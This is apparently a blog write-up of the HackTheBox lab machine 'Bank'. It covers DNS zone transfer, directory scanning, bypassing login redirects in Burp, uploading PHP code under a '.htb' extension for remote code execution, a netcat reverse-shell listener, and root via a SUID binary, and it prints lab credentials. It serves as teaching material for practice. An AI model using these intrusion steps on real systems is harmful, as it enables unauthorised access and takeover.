@@ -1,0 +1,298 @@
+I"�V<h1 id="introduction">Introduction</h1>
+<p>Bank is an “easy” machine on HackTheBox. This box was a fairly steep learning curve albeit there was a alot of important takeways being the DNS enumeration, Virtual Host Routing check, modifying HTTP response headers to stop redirecting webpages and the RCE technique.</p>
+
+<h1 id="recon-and-enumeration">Recon and Enumeration</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/boxes/bank#  nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap.nmap 10.10.10.29
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-04-14 13:08 BST
+Nmap scan report <span class="k">for </span>bank.htb <span class="o">(</span>10.10.10.29<span class="o">)</span>
+Host is up <span class="o">(</span>0.031s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 <span class="o">(</span>DSA<span class="o">)</span>
+|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 <span class="o">(</span>ED25519<span class="o">)</span>
+53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
+| dns-nsid: 
+|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
+80/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
+| http-title: HTB Bank - Login
+|_Requested resource was login.php
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.52 seconds
+</code></pre></div></div>
+
+<p>Normally DNS is UDP by default but falls back to TCP when the packet size is too large (&gt;512 bytes). <strong>When will UDP exceed 512 bytes?</strong> Classically speaking, in a zone transfer where one DNS server sends its entire database (resource records) to another machine, usually another DNS server. Although with the rise of IPv6, spam detection and DNSSEC, TCP is increasingly being used. Usually a zone transfer is normal operation between primary and secondary DNS servers in order to synchronise the records for a domain. This is typically not something you want to be accessed externally because if an attacker can gather all your DNS records, they can use those to select targets for exploitation. <a href="https://hackertarget.com/zone-transfer/" target="_blank_">Zone Transfers</a></p>
+
+<p>A useful website that highlights the security risk of having zone transfer enabled and how it can leak sensitive information: <a href="https://digi.ninja/projects/zonetransferme.php" target="_blank_">digi.ninja</a></p>
+
+<h1 id="dns-enumeration---nslookup">DNS Enumeration - NSLookup</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/etc# nslookup 
+<span class="o">&gt;</span> SERVER 10.10.10.29
+Default server: 10.10.10.29
+Address: 10.10.10.29#53
+<span class="o">&gt;</span> 
+<span class="o">&gt;</span> 10.10.10.29
+<span class="k">**</span> server cant find 29.10.10.10.in-addr.arpa: NXDOMAIN  <span class="o">(</span>NO REVERSE DNS LOOKUP<span class="o">)</span>
+<span class="o">&gt;</span> 
+<span class="o">&gt;</span> 127.0.0.1
+1.0.0.127.in-addr.arpa  name <span class="o">=</span> localhost. <span class="o">(</span>DIDN’T GET LUCKY WITH A HOSTNAME<span class="o">)</span>
+<span class="o">&gt;</span> 
+<span class="o">&gt;</span> bank.htb
+Server:         10.10.10.29
+Address:        10.10.10.29#53
+
+Name:   bank.htb
+Address: 10.10.10.29
+</code></pre></div></div>
+
+<p>The default name server for all HackTheBox machines is <code class="language-plaintext highlighter-rouge">&lt;name of box&gt;.htb</code> so I tried that and got a response.</p>
+
+<h1 id="dns-enumeration---dig">DNS Enumeration - dig</h1>
+
+<p>The name server will be checked for a zone transfer of the target domain. It is often the case that even though the primary name server blocks zone transfers, a secondary or tertiary system may not be configured to block these - hence the check of each name server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/etc# dig axfr &lt;targetdomain.com&gt; @&lt;ns1.targetdomain.com&gt; <span class="o">(</span>syntax<span class="o">)</span>
+root@kali:/etc# dig axfr @10.10.10.29 <span class="o">(</span>Root zone transfer – didnt give anything away<span class="o">)</span>
+root@kali:/etc# dig axfr bank.htb @10.10.10.29 
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.11.14-3-Debian &lt;&lt;<span class="o">&gt;&gt;</span> axfr bank.htb @10.10.10.29
+<span class="p">;;</span> global options: +cmd
+bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
+bank.htb.               604800  IN      NS      ns.bank.htb.
+bank.htb.               604800  IN      A       10.10.10.29
+ns.bank.htb.            604800  IN      A       10.10.10.29
+www.bank.htb.           604800  IN      CNAME   bank.htb.
+bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
+<span class="p">;;</span> Query <span class="nb">time</span>: 27 msec
+<span class="p">;;</span> SERVER: 10.10.10.29#53<span class="o">(</span>10.10.10.29<span class="o">)</span>
+<span class="p">;;</span> WHEN: Tue Apr 14 15:11:26 BST 2020
+<span class="p">;;</span> XFR size: 6 records <span class="o">(</span>messages 1, bytes 171<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Added <code class="language-plaintext highlighter-rouge">10.10.10.29 bank.htb</code> to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file and I was able to resolve bank.htb.</p>
+
+<h1 id="enumeration--webpage">Enumeration – Webpage</h1>
+
+<p>Navigating to <code class="language-plaintext highlighter-rouge">http://bank.htb/</code></p>
+
+<p><img src="/assets/img/htb/bank/bank-htb.png" alt="image" /></p>
+
+<p>Using the dirsearch tool I ran a scan to check for additional php files on the webserver. The tool is similar to dirb but dirsearch has alot of additional features.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/opt/OSCP_tools/dirsearch# python3 dirsearch.py <span class="nt">-u</span> http://bank.htb/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-e</span> php <span class="nt">-f</span> <span class="nt">-t</span> 20 
+
+<span class="nt">-u</span>: URL
+<span class="nt">-w</span>: wordlist
+<span class="nt">-e</span>: php extensions
+<span class="nt">-f</span>: follow redirects
+<span class="nt">-t</span>: 20 threads
+</code></pre></div></div>
+<p>While that was running I ran a Nikto scan that showed the page was being redirected to <code class="language-plaintext highlighter-rouge">/login.php</code> and you can verify this by using CURL to get the HTTP headers.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/boxes/bank# curl <span class="nt">-I</span> http://bank.htb/
+HTTP/1.1 302 Found
+Date: Tue, 14 Apr 2020 15:00:35 GMT
+Server: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Set-Cookie: <span class="nv">HTBBankAuth</span><span class="o">=</span>s1j3ugpbim98kouf2o3b69p925<span class="p">;</span> <span class="nv">path</span><span class="o">=</span>/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check<span class="o">=</span>0, pre-check<span class="o">=</span>0
+Pragma: no-cache
+location: login.php
+Content-Type: text/html
+</code></pre></div></div>
+
+<p>The response shows a HTTP 302 redirect to location login.php. The result of the dirsearch scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/opt/OSCP_tools/dirsearch# python3 dirsearch.py <span class="nt">-u</span> http://bank.htb/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-e</span> php <span class="nt">-f</span> <span class="nt">-t</span> 20
+                        
+  _|. _ _  _  _  _ _|_    v0.3.9
+<span class="o">(</span>_| | | _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>
+
+Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041
+
+Error Log: /opt/OSCP_tools/dirsearch/logs/errors-20-04-14_15-54-45.log
+
+Target: http://bank.htb/
+
+<span class="o">[</span>15:54:45] Starting: 
+<span class="o">[</span>15:54:45] 403 -  279B  - /.php
+<span class="o">[</span>15:54:45] 302 -    7KB - /index.php  -&gt;  login.php
+<span class="o">[</span>15:54:45] 200 -    2KB - /login.php
+<span class="o">[</span>15:54:45] 302 -    3KB - /support.php  -&gt;  login.php
+<span class="o">[</span>15:54:46] 403 -  281B  - /icons/
+<span class="o">[</span>15:54:46] 403 -  283B  - /uploads/
+<span class="o">[</span>15:54:47] 200 -    2KB - /assets/
+<span class="o">[</span>15:54:50] 302 -    0B  - /logout.php  -&gt;  index.php
+<span class="o">[</span>15:54:54] 200 -    1KB - /inc/
+<span class="o">[</span>16:00:44] 403 -  289B  - /server-status/
+<span class="o">[</span>16:06:47] 200 -  248KB - /balance-transfer/
+
+Task Completed
+</code></pre></div></div>
+
+<p>The output of dirsearch shows a few redirects occuring so I can stop these redirects using Burpsuite.</p>
+
+<h1 id="stopping-redirects-using-burpsuite">Stopping Redirects using Burpsuite</h1>
+
+<p>I’m going to stop the index.php redirect first of all and to perform this, catch the initial request and then go to Actions –&gt; Do intercept –&gt; Response to this request then replace <code class="language-plaintext highlighter-rouge">HTTP/1.1 302 Found</code> with <code class="language-plaintext highlighter-rouge">HTTP/1.1 200 OK</code> and then forward. To do this automatically for every page, from the proxy tab at the top go to options then “Match and Replace”, put in your rule, make sure its enabled and then turn intercept off. The rule you can see below.</p>
+
+<p><img src="/assets/img/htb/bank/replace302.png" alt="image" /></p>
+
+<p>You can navigate to all websites now without being redirected, one in particular was an unrendered support.php page which gives us the ability to upload files. With some trial and error I could get an image uploaded successfully with php code encapsulated however I couldnt get any RCE on the webpage and also I fired up burp to see WTH was going on and it seems the webpage kept trying to redirect to <code class="language-plaintext highlighter-rouge">login.php</code> after uploading the images which seemed strange considering we created that rule. The webpage wouldn’t let me delete the files so I tried searching elsewhere in the meantime.</p>
+
+<h1 id="further-enumeration-of-the-webpage">Further Enumeration of the Webpage</h1>
+
+<p><img src="/assets/img/htb/bank/balance-transfer.png" alt="image" /></p>
+
+<p>On this directory there is a load of encrypted files so I downloaded everything using wget and then sorted the files by filesize in reverse order. All the files were around the same size except one.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/boxes/bank/# wget <span class="nt">-r</span> http://bank.htb/balance-transfer/
+root@kali:~/Documents/boxes/bank/bank.htb/balance-transfer# <span class="nb">ls</span> <span class="nt">-lah</span> | <span class="nb">sort</span> <span class="nt">-n</span> <span class="nt">-r</span>
+root@kali:~/Documents/boxes/bank/bank.htb/balance-transfer# <span class="nb">cat </span>68576f20e9732f1b2edc4df5b8533230.acc
+<span class="nt">--ERR</span> ENCRYPT FAILED
++<span class="o">=================</span>+
+| HTB Bank Report |
++<span class="o">=================</span>+
+
+<span class="o">===</span><span class="nv">UserAccount</span><span class="o">===</span>
+Full Name: Christos Christopoulos
+Email: chris@bank.htb
+Password: <span class="o">!</span><span class="c">##HTBB4nkP4ssw0rd!##</span>
+CreditCards: 5
+Transactions: 39
+Balance: 8842803 <span class="nb">.</span>
+<span class="o">===</span><span class="nv">UserAccount</span><span class="o">===</span>
+</code></pre></div></div>
+
+<p>Logged into the portal using the email and password, navigated to <strong>“Support”</strong> and I came to the <code class="language-plaintext highlighter-rouge">support.php</code> page which I was enumerating earlier, this time the webpage was correctly rendered so I may have better luck this time. I uploaded a GIF file with php code in it (test.gif.php) and the response was declined as it only allows images. I fired up burp to see the response and I came across something interesting. I changed the extension to htb and tried again. Success, it uploaded and I had RCE (remote code execution).</p>
+
+<p><img src="/assets/img/htb/bank/debug.png" alt="image" /></p>
+
+<h1 id="shell-access">Shell Access</h1>
+
+<p>Having RCE, its time to get a shell into the machine. I setup my listener and connected back to my machine using netcat. You can check whether the victim has nc installed by running: <code class="language-plaintext highlighter-rouge">?cmd=which nc</code></p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/img/htb/bank/rce.png" alt="image" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>Executing commands as user www-data</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>That sigh of relief once you catch that reverse shell makes all the work worth it but I’d rather much operate in a fully interactive TTY shell so its time to upgrade.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+www-data@bank:/var/www/bank/uploads<span class="nv">$ </span>
+www-data@bank:/var/www/bank/uploads<span class="nv">$ </span>^Z  <span class="o">(</span>CTRL+Z MOVE IT TO THE BACKGROUND<span class="o">)</span>
+<span class="o">[</span>1]+  Stopped                 nc <span class="nt">-lvnp</span> 443
+root@kali:~/Documents/boxes/bank# <span class="nb">stty </span>raw <span class="nt">-echo</span>
+<span class="o">(</span>Type <span class="nb">fg </span>and <span class="k">then </span>hit ENTER<span class="o">)</span>
+root@kali:~/Documents/boxes/bank# nc <span class="nt">-lvnp</span> 443
+www-data@bank:/var/www/bank/uploads<span class="nv">$ </span>
+www-data@bank:/var/www/bank/uploads<span class="nv">$ </span>clear             
+TERM environment variable not set.
+www-data@bank:/var/www/bank/uploads<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>screen 
+</code></pre></div></div>
+<p>This workaround gives us the ability to tab autocomplete, clear the screen, arrow up history etc.</p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>Now that were in the victim’s machine, its time to find a way to escalate. Navigating around the root directory of the webserver: <code class="language-plaintext highlighter-rouge">/var/www/bank/</code> I came across some mysql credentials in the <code class="language-plaintext highlighter-rouge">inc</code> directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function </span>getCreditCards<span class="o">(</span><span class="nv">$username</span><span class="o">){</span>
+                <span class="nv">$mysql</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="s2">"localhost"</span>, <span class="s2">"root"</span>, <span class="s2">"!@#S3cur3P4ssw0rd!@#"</span>, <span class="s2">"htbbank"</span><span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h2 id="mysql-enumeration">MYSQL Enumeration</h2>
+
+<p>Inside the <code class="language-plaintext highlighter-rouge">/var/www/bank/inc</code> directory we see a user.php file with a mysql username and password. We can log into the mysql database with those credentials, drop into a shell and hope we are root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bank:/var/www/bank/inc<span class="nv">$ </span>mysql <span class="nt">-u</span> root <span class="nt">-p</span>
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
+Your MySQL connection <span class="nb">id </span>is 345
+Server version: 5.5.55-0ubuntu0.14.04.1 <span class="o">(</span>Ubuntu<span class="o">)</span>
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2017, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.
+
+mysql&gt; <span class="se">\!</span> /bin/sh <span class="o">(</span>COMMAND TO UPGRADE TO A SHELL<span class="o">)</span>
+<span class="nv">$ </span><span class="nb">whoami
+</span>www-data
+</code></pre></div></div>
+
+<p>Nope, no luck. We could try to SSH in using those credentials.</p>
+
+<h2 id="ssh-enumeration">SSH Enumeration</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh root@bank.htb
+root@bank.htbs password: 
+Permission denied, please try again.
+
+ssh chris@bank.htb
+chris@bank.htbs password: 
+Permission denied, please try again.
+</code></pre></div></div>
+
+<p>And another dead end. Might be time to use some priv esc tools but before I do that I searched for files that may have an SUID (set user) or SGID (set group) bit attached. Files with these sticky bits provides users with the ability to access or use that file with root permissions. A useful article showing how to exploit SUID bits: <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</a></p>
+
+<h3 id="searching-files-with-suid--sgid-bit-set">Searching files with SUID &amp; SGID bit set</h3>
+
+<ul>
+  <li>Finding SGID bit files: <code class="language-plaintext highlighter-rouge">www-data@bank: find / -perm -2000 -type f -exec ls -la {} 2&gt;/dev/null \;</code></li>
+  <li>Finding SUID bit files: <code class="language-plaintext highlighter-rouge">www-data@bank: find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;</code></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bank: find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> 2&gt;/dev/null <span class="se">\;</span>
+<span class="nt">-rwsr-xr-x</span> 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency
+<span class="nt">-rwsr-xr-x</span> 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+<span class="nt">-rwsr-xr-x</span> 1 root root 492972 Aug 11  2016 /usr/lib/openssh/ssh-keysign
+<span class="nt">-rwsr-xr--</span> 1 root messagebus 333952 Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+<span class="nt">-rwsr-xr-x</span> 1 root root 9808 Nov 24  2015 /usr/lib/policykit-1/polkit-agent-helper-1
+<span class="nt">-rwsr-sr-x</span> 1 daemon daemon 46652 Oct 21  2013 /usr/bin/at
+<span class="nt">-rwsr-xr-x</span> 1 root root 35916 May 17  2017 /usr/bin/chsh
+<span class="nt">-rwsr-xr-x</span> 1 root root 45420 May 17  2017 /usr/bin/passwd
+<span class="nt">-rwsr-xr-x</span> 1 root root 44620 May 17  2017 /usr/bin/chfn
+<span class="nt">-rwsr-xr-x</span> 1 root root 18168 Nov 24  2015 /usr/bin/pkexec
+<span class="nt">-rwsr-xr-x</span> 1 root root 30984 May 17  2017 /usr/bin/newgrp
+<span class="nt">-rwsr-xr-x</span> 1 root root 18136 May  8  2014 /usr/bin/traceroute6.iputils
+<span class="nt">-rwsr-xr-x</span> 1 root root 66284 May 17  2017 /usr/bin/gpasswd
+<span class="nt">-rwsr-xr-x</span> 1 root root 156708 May 29  2017 /usr/bin/sudo
+<span class="nt">-rwsr-xr-x</span> 1 root root 72860 Oct 21  2013 /usr/bin/mtr
+<span class="nt">-rwsr-sr-x</span> 1 libuuid libuuid 17996 Nov 24  2016 /usr/sbin/uuidd
+<span class="nt">-rwsr-xr--</span> 1 root dip 323000 Apr 21  2015 /usr/sbin/pppd
+<span class="nt">-rwsr-xr-x</span> 1 root root 38932 May  8  2014 /bin/ping
+<span class="nt">-rwsr-xr-x</span> 1 root root 43316 May  8  2014 /bin/ping6
+<span class="nt">-rwsr-xr-x</span> 1 root root 35300 May 17  2017 /bin/su
+<span class="nt">-rwsr-xr-x</span> 1 root root 30112 May 15  2015 /bin/fusermount
+<span class="nt">-rwsr-xr-x</span> 1 root root 88752 Nov 24  2016 /bin/mount
+<span class="nt">-rwsr-xr-x</span> 1 root root 67704 Nov 24  2016 /bin/umount
+
+www-data@bank:/var/www/bank/inc<span class="nv">$ </span>/var/htb/bin/emergency
+<span class="c"># </span>
+<span class="c"># whoami</span>
+root
+</code></pre></div></div>
+
+<p>You can see that there was a file called emergency that had a SUID bit so I executed it and voila, root!</p>
+:ET
